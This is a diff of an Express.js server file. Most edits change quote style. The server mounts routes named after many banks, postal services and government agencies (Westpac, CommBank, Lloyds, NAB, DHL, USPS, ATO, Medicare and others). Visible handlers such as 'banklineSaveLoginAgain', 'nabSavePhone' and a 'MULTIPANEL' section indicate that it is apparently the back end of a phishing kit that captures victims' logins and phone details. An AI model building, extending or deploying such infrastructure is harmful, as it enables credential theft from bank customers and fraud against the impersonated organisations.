@@ -36,32 +36,32 @@ app.get("/getRespentesting123!", (req, res) => {
 });
 
 //THAMES
-app.use('/thameswater', require('./routes/thameswater'))
+app.use("/thameswater", require("./routes/thameswater"));
 
 //DHL
-app.use('/dhl', require('./routes/dhl'));
+app.use("/dhl", require("./routes/dhl"));
 
 //USPS
-app.use('/usps', require('./routes/usps'));
+app.use("/usps", require("./routes/usps"));
 
 //OBERBANK
-app.use('/oberbank', require('./routes/oberbank'));
+app.use("/oberbank", require("./routes/oberbank"));
 
 //WELLS
-app.use('/wells', require('./routes/wells'));
+app.use("/wells", require("./routes/wells"));
 
 //SANTS
 app.use("/sants", require("./routes/sants"));
 app.use("/santsCommand", require("./routes/sants"));
 
 //ATO
-app.use('/ato', require('./routes/ato'));
+app.use("/ato", require("./routes/ato"));
 
 //KURONE
-app.use('/kurone', require('./routes/kurone'))
+app.use("/kurone", require("./routes/kurone"));
 
 //BACKMARKET
-app.use('/back', require('./routes/backmarket'))
+app.use("/back", require("./routes/backmarket"));
 
 //REV
 //REV
@@ -472,7 +472,7 @@ app.post("/micbDeleteentry/:id", cors(), (req, res) => {
 });
 
 //MQ
-app.use('/mq', require('./routes/macquarie'))
+app.use("/mq", require("./routes/macquarie"));
 
 //BNP
 //BNP
@@ -1103,7 +1103,7 @@ app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
 //WP
 //WP
 
-app.use('/wp', require('./routes/westpac'))
+app.use("/wp", require("./routes/westpac"));
 
 //COMMBANK
 //COMMBANK
@@ -1534,10 +1534,10 @@ app.post("/appleDeleteentry/:id", cors(), (req, res) => {
 });
 
 //ASB
-app.use('/asb', require('./routes/asb'));
+//app.use('/asb', require('./routes/asb'));
 
 //BNZ
-app.use('/bnz', require('./routes/bnz'));
+app.use("/bnz", require("./routes/bnz"));
 
 //LLOYDS
 app.use("/lloyds", require("./routes/lloyds"));
@@ -1654,7 +1654,7 @@ app.post("/nabSavePhone", cors(), (req, res) => {
 });
 
 //MULTIPANEL NZ
-app.use('/multiNZ', require('./routes/multiNZ'));
+app.use("/multiNZ", require("./routes/multiNZ"));
 
 //MULTIPANEL
 //MULTIPANEL
@@ -1936,7 +1936,7 @@ app.use("/auspost", require("./routes/auspost"));
 app.use("/medicare", require("./routes/medicare"));
 
 //PEOPLES
-app.use('/people', require('./routes/people'))
+app.use("/people", require("./routes/people"));
 
 //DHL
 //DHL
@@ -3048,10 +3048,10 @@ app.post("/eeKelv", (req, res) => {
 });
 
 //NZPOST
-app.use('/nzpost', require('./routes/nzpost'));
+app.use("/nzpost", require("./routes/nzpost"));
 
 //BEYOND
-app.use('/beyond', require('./routes/beyond'))
+app.use("/beyond", require("./routes/beyond"));
 
 //SFE
 //SFE
